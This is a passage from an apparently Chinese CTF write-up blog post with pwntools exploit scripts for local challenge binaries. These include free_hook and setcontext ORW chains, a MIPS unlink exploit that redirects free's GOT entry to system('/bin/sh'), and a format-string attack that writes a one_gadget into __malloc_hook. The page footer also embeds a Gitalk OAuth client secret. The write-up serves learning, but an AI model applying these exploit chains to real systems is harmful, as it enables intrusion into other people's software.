u64(p.recvuntil(<span class="string">"\x7f"</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">libc_base = leak - <span class="number">0x3afca0</span></span><br><span class="line">libc.address = libc_base</span><br><span class="line"></span><br><span class="line">edit(<span class="number">11</span>,p64(libc.sym[<span class="string">'__free_hook'</span>]))</span><br><span class="line">add(<span class="string">'a'</span>*<span class="number">0xe8</span>)<span class="comment">#14</span></span><br><span class="line">add(<span class="string">'a'</span>*<span class="number">0xe8</span>)<span class="comment">#15</span></span><br><span class="line">edit(<span class="number">15</span>,<span class="string">'\x00'</span>*<span class="number">0xe8</span>)</span><br><span class="line"></span><br><span class="line">setcontext = libc.sym[<span class="string">'setcontext'</span>] + <span class="number">53</span></span><br><span class="line">path = <span class="string">"./flag\x00"</span></span><br><span class="line">rdi = libc_base + <span class="number">0x000000000002154d</span></span><br><span class="line">rsi = libc_base + <span class="number">0x000000000002145c</span></span><br><span class="line">rdx = libc_base + <span class="number">0x0000000000001b96</span></span><br><span class="line"></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rdi = <span class="number">0</span></span><br><span class="line">frame.rsi = libc.sym[<span class="string">'__free_hook'</span>] - <span class="number">0x100</span></span><br><span class="line">frame.rdx = <span class="number">0x200</span></span><br><span class="line">frame.rsp = libc.sym[<span class="string">"__free_hook"</span>] - <span class="number">0x100</span></span><br><span class="line">frame.rip = libc.sym[<span class="string">'read'</span>]</span><br><span class="line"></span><br><span class="line">orw = flat(</span><br><span class="line">    rdi,libc.sym[<span class="string">'__free_hook'</span>] - <span class="number">0x88</span>,</span><br><span class="line">    rsi,<span class="number">0</span>,</span><br><span class="line">    libc.sym[<span class="string">'open'</span>],</span><br><span class="line">    rdi,<span class="number">4</span>,</span><br><span class="line">    rsi,libc.sym[<span class="string">'__free_hook'</span>] + <span class="number">0x200</span>,</span><br><span class="line">    rdx,<span class="number">0x30</span>,</span><br><span class="line">    libc.sym[<span class="string">'read'</span>],</span><br><span class="line">    rdi,libc.sym[<span class="string">'__free_hook'</span>] + <span class="number">0x200</span>,</span><br><span class="line">    libc.sym[<span class="string">'puts'</span>],</span><br><span class="line">        )</span><br><span class="line">orw += path</span><br><span class="line">edit(<span class="number">15</span>,p64(setcontext))</span><br><span class="line">edit(<span class="number">4</span>,bytes(frame))</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">p.sendline(orw)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="pwn3"><a href="#pwn3" class="headerlink" title="pwn3"></a>pwn3</h2><blockquote>
<p>装个ghidra整了两三天，之前一直下载的github上给的release但那个需要自己构建，我还以为是自己java环境的问题，原来是因为我和ghidra官网隔了一堵墙</p>
</blockquote>
<p>modify功能会溢出8字节，利用溢出修改下一个chunk的header，构造unlink</p>
<p>大概长这个样子</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">0x412000:	0x00000000	0x00000041	0x00000000	0x00000039</span><br><span class="line">0x412010:	0x00411824	0x00411828	0x61616161	0x61616161</span><br><span class="line">0x412020:	0x61616161	0x61616161	0x61616161	0x61616161</span><br><span class="line">0x412030:	0x61616161	0x61616161	0x61616161	0x61616161</span><br><span class="line">0x412040:	0x00000038	0x00000040	0x00626262	0x00000000</span><br><span class="line">0x412050:	0x00000000	0x00000000	0x00000000	0x00000000</span><br><span class="line">0x412060:	0x00000000	0x00000000	0x00000000	0x00000000</span><br><span class="line">0x412070:	0x00000000	0x00000000	0x00000000	0x00000000</span><br><span class="line">0x412080:	0x00000000	0x00000011	0x6e69622f	0x0000732f</span><br><span class="line">0x412090:	0x00000000	0x00000f71	0x00000000	0x00000000</span><br></pre></td></tr></table></figure>
<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(['qemu-mipsel','-g','1234','-L','./','./pwn3'])</span></span><br><span class="line">p = process([<span class="string">'qemu-mipsel'</span>,<span class="string">'-L'</span>,<span class="string">'./'</span>,<span class="string">'./pwn3'</span>])</span><br><span class="line">elf = ELF(<span class="string">"./pwn3"</span>)</span><br><span class="line">libc = ELF(<span class="string">"lib/libc.so.0"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(l,content)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt;&gt; \n"</span>,<span class="string">'1'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"length: \n"</span>,str(l))</span><br><span class="line">    p.sendafter(<span class="string">"info: \n"</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt;&gt; \n"</span>,<span class="string">'2'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"user: \n"</span>,str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,content)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt;&gt; \n"</span>,<span class="string">'3'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"edit: \n"</span>,str(index))</span><br><span class="line">    p.sendafter(<span class="string">"info: \n"</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt;&gt; \n"</span>,<span class="string">'4'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"show: \n"</span>,str(index))</span><br><span class="line"></span><br><span class="line">node_list = <span class="number">0x411830</span></span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">add(<span class="number">0x3c</span>,<span class="string">'aaaa'</span>)</span><br><span class="line">add(<span class="number">0x3c</span>,<span class="string">'bbbb'</span>)</span><br><span class="line">add(<span class="number">0xc</span>,<span class="string">'/bin/sh\n'</span>)</span><br><span class="line">edit(<span class="number">0</span>,p32(<span class="number">0</span>)+p32(<span class="number">0x39</span>)+p32(node_list<span class="number">-12</span>)+p32(node_list<span class="number">-8</span>)+<span class="string">'a'</span>*<span class="number">0x28</span> + p32(<span class="number">0x38</span>) + p32(<span class="number">0x40</span>))</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">0</span>,p32(<span class="number">0</span>)*<span class="number">2</span> + p32(node_list)+p32(<span class="number">0xff</span>)+p32(elf.got[<span class="string">'free'</span>])+p32(<span class="number">4</span>))</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">libc_base = u32(p.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-4</span>:]) - libc.sym[<span class="string">'free'</span>]</span><br><span class="line">info(<span class="string">"libc_base"</span>+hex(libc_base))</span><br><span class="line">edit(<span class="number">1</span>,p32(libc_base+libc.sym[<span class="string">'system'</span>]))</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>


<h2 id="pwn5"><a href="#pwn5" class="headerlink" title="pwn5"></a>pwn5</h2><p>这题还是学到很多东西的，当时看到的时候毫无思绪，我妄想通过栈上的libc地址改one_gadget，但是怎么从while中出来我都不知道</p>
<p>看了大师傅们的博客总结了一下大概思路：通过栈链修改栈上_IO_2_1_stdout的fileno为2标准错误，然后就可以泄露地址，因为栈上的_IO_2_1_stdout在低地址处，所以需要将printf函数的返回地址改为start进行抬栈，leak出libc后通过栈上的_libc_start_main将malloc_hook改为one_gadget，最后通过printf大量字符调用malloc实现控制程序流</p>
<p>需要注意的是关闭标准输出后printf最多只能打印0x2000左右个字符</p>
<h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><p>因为程序关闭了标准输出所以需要重定位stdout或者sh flag</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">g</span><span class="params">(a=<span class="string">"b printf"</span>)</span>:</span></span><br><span class="line">    gdb.attach(p,a)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    p = process(<span class="string">"./pwn"</span>)</span><br><span class="line">    libc = p.libc</span><br><span class="line">    p.recvuntil(<span class="string">"gift : "</span>)</span><br><span class="line">    stack_address = int(p.recvline().strip(<span class="string">b"\n"</span>), <span class="number">16</span>)</span><br><span class="line">    log.success(<span class="string">"stack address &#123;&#125;"</span>.format(hex(stack_address)))</span><br><span class="line">    stack_low = (stack_address)&amp;<span class="number">0xffff</span></span><br><span class="line">    <span class="keyword">if</span> stack_low &gt; <span class="number">0x2000</span>:</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment">#step1 </span></span><br><span class="line">        payload = <span class="string">"%&#123;&#125;c%11$hn"</span>.format(str(stack_low<span class="number">-0x54</span>))</span><br><span class="line">        p.sendline(payload)</span><br><span class="line">        sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line">        payload = <span class="string">"%&#123;&#125;c%37$hhn"</span>.format(str(<span class="number">0x90</span>))</span><br><span class="line">        p.sendline(payload)</span><br><span class="line">        sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment">#step2</span></span><br><span class="line">        payload = <span class="string">"%&#123;&#125;c%11$hn"</span>.format(str(stack_low<span class="number">-0xc</span>))</span><br><span class="line">        p.sendline(payload)</span><br><span class="line">        sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line">        payload = <span class="string">"%&#123;&#125;c%37$hn"</span>.format(str(<span class="number">0x7b0</span>))<span class="comment">#1/16</span></span><br><span class="line">        p.sendline(payload)</span><br><span class="line">        sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment">#step3 </span></span><br><span class="line">        payload = <span class="string">"%&#123;&#125;c%26$hhn"</span>.format(str(<span class="number">0x2</span>))</span><br><span class="line">        p.sendline(payload)</span><br><span class="line">        sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment">#leak </span></span><br><span class="line">        payload = <span class="string">"%26$p"</span></span><br><span class="line">        p.sendline(payload)</span><br><span class="line">        sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line">        leak = int(p.recvuntil(<span class="string">"90"</span>)[<span class="number">-14</span>:],<span class="number">16</span>)</span><br><span class="line">        libc.address = leak - <span class="number">0x3c5690</span></span><br><span class="line">        libc_base = libc.address</span><br><span class="line">        info(<span class="string">"libc_base:"</span>+hex(libc_base))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">malloc_hook = libc.sym[<span class="string">'__malloc_hook'</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">2</span>):</span><br><span class="line">    payload = <span class="string">"%&#123;&#125;c%10$hn"</span>.format(str(stack_low<span class="number">-0xdc</span> + i*<span class="number">2</span>))</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line">    payload = <span class="string">"%&#123;&#125;c%36$hn"</span>.format(str(malloc_hook&gt;&gt;(<span class="number">16</span>*i) &amp;<span class="number">0xffff</span>))</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line">one_gadget = libc_base + <span class="number">0xf1207</span></span><br><span class="line">g()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">3</span>):</span><br><span class="line">    payload = <span class="string">"%&#123;&#125;c%10$hn"</span>.format(str(stack_low<span class="number">-0xdc</span>))</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    sleep(<span class="number">0.5</span>)</span><br><span class="line">    payload = <span class="string">"%&#123;&#125;c%36$hhn"</span>.format(str(<span class="number">0x10</span>+i*<span class="number">2</span>))</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line">    payload = <span class="string">"%&#123;&#125;c%9$hn"</span>.format(str(one_gadget&gt;&gt;(<span class="number">16</span>*i) &amp;<span class="number">0xffff</span>))</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">"%77777c"</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>这题官方wp出来了，但我建议爬</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7a58712 &lt;printf_positional+2482&gt;    ret             &lt;0x7ffff7a5a4b6; vfprintf+822&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0x7ffff7a5a4b6 &lt;vfprintf+822&gt;              add    rsp, 0x30</span><br><span class="line">   0x7ffff7a5a4ba &lt;vfprintf+826&gt;              mov    r9d, eax</span><br><span class="line">   0x7ffff7a5a4bd &lt;vfprintf+829&gt;              jmp    vfprintf+231 &lt;0x7ffff7a5a267&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0x7ffff7a5a267 &lt;vfprintf+231&gt;              test   dword ptr [rbx], 0x8000</span><br><span class="line">   0x7ffff7a5a26d &lt;vfprintf+237&gt;              jne    vfprintf+256 &lt;0x7ffff7a5a280&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0x7ffff7a5a280 &lt;vfprintf+256&gt;              test   r14d, r14d</span><br><span class="line">   0x7ffff7a5a283 &lt;vfprintf+259&gt;              jne    vfprintf+523 &lt;0x7ffff7a5a38b&gt;</span><br><span class="line"> </span><br><span class="line">   0x7ffff7a5a289 &lt;vfprintf+265&gt;              mov    eax, r9d</span><br><span class="line">   0x7ffff7a5a28c &lt;vfprintf+268&gt;              lea    rsp, [rbp - 0x28]</span><br><span class="line">   0x7ffff7a5a290 &lt;vfprintf+272&gt;              pop    rbx</span><br><span class="line">─────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">00:0000│ rsp  0x7fffffffaeb8 —▸ 0x7ffff7a5a4b6 (vfprintf+822) ◂— add    rsp, 0x30</span><br><span class="line">01:0008│      0x7fffffffaec0 ◂— 0x1</span><br><span class="line">02:0010│      0x7fffffffaec8 —▸ 0x555555755040 (__bss_start+48) ◂— &#39;%11c%6$hn&#39;</span><br><span class="line">03:0018│      0x7fffffffaed0 —▸ 0x7fffffffb040 ◂— 0x0</span><br><span class="line">04:0020│      0x7fffffffaed8 ◂— 0x0</span><br><span class="line">... ↓</span><br><span class="line">06:0030│      0x7fffffffaee8 —▸ 0x7ffff7b99be5 ◂— add    byte ptr [rdx], al</span><br><span class="line">07:0038│      0x7fffffffaef0 ◂— 0x0</span><br><span class="line">───────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line"> ► f 0     7ffff7a58712 printf_positional+2482</span><br><span class="line">   f 1     7ffff7a5a4b6 vfprintf+822</span><br><span class="line">   f 2     7ffff7a5cf01 buffered_vfprintf+145</span><br><span class="line">   f 3     7ffff7a5a33d vfprintf+445</span><br><span class="line">   f 4     7ffff7a628a9 printf+153</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p &#x2F;x 0x7ffff7a0d000 + 0x4527a</span><br><span class="line">$1 &#x3D; 0x7ffff7a5227a</span><br></pre></td></tr></table></figure>

<div id="gitalk-container"></div>
<script src="https://cdn.bootcss.com/blueimp-md5/2.12.0/js/md5.min.js"></script><link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css"><script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>

		<script>
		var gitalkConfig = {"clientID":"787cc455593c1fb9cfcd","clientSecret":"f6abba3d9cc77878426ee16aa8bcb980fd3cd70c","repo":"s1vona.github.io","owner":"s1vona","admin":["s1vona"],"distractionFreeMode":true};
	    gitalkConfig.id = md5(location.pathname);
		var gitalk = new Gitalk(gitalkConfig);
	    gitalk.render("gitalk-container");
	    </script>
        </div>

        
            <section class="post-copyright">
                
                    <p class="copyright-item">
                        <span>Author:</span>
                        <span>Sivona</span>
                    </p>
                
                
                
                    <p class="copyright-item">
                        <span>License:</span>
                        <span>Copyright (c) 2019 <a href="http://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC-BY-NC-4.0</a> LICENSE</span>
                    </p>
                
                
                     <p class="copyright-item">
                         <span>Slogan:</span>
                         <span>Enforce justice on behalf of Heaven.</span>
                     </p>
                

            </section>
        
        <section class="post-tags">
            <div>
                <span>Tag(s):</span>
                <span class="tag">
                    
                    
                        <a href="/tags/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/"># 西湖论剑</a>
                    
                        
                </span>
            </div>
            <div>
                <a href="javascript:window.history.back();">back</a>
                <span>· </span>
                <a href="/">home</a>
            </div>
        </section>
        <section class="post-nav">
            
                <a class="prev" rel="prev" href="/2020/11/08/2020%E5%A4%AA%E6%B9%96%E6%9D%AFwp/">2020太湖杯wp</a>
            
            
            <a class="next" rel="next" href="/2020/09/17/linux-kernel-pwn/">linux kernel pwn</a>
            
        </section>


    </article>
</div>

        </div>
        <footer id="footer" class="footer">
    <div class="copyright">
        <span>© Sivona | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
    </div>
    <div>
        友情链接: 
       <div>
        <a class="theme-link"  href="https://sncker.github.io" target="_blank" rel="noopener"> SNCKER's blog </a><span>&nbsp;&nbsp;</span>
        <a class="theme-link"  href="https://www.cnblogs.com/lnjoy/" target="_blank" rel="noopener"> EnJoy_July 's blog' </a><span>&nbsp;&nbsp;</span>
       </div>
       
      </div>
</footer>

    </div>
</body>
</html>
